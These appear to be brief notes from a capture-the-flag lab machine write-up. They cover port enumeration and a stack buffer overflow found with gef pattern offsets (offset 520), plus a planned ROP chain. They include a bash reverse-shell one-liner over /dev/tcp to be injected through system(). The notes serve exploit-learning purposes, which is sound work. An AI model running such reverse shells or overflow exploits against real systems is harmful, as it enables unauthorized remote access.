
### Enumeration

Two ports open 22, 80

10.129.227.96


### Buffer overflow

the char code from Ghidra says to accept char buffer [512]

```bash
gef➤ pattern create 600

gef➤  pattern offset $rsp
[+] Searching for '7061616161616163'/'6361616161616170' with period=8
[+] Found at offset 520 (little-endian search) likely
gef➤
```

For this buffer overflow, we need to inject into the "system" the following command

```bash
bash -c 'bash -i &> /dev/tcp/<ip address>/port 0>&1'
```

For this exploit, we need the following settings
	- activate license address
	- libc address
	- inject pop rdi
	- pop rsi
	- mov [rdi], rsi
	- the writeable section ".data"


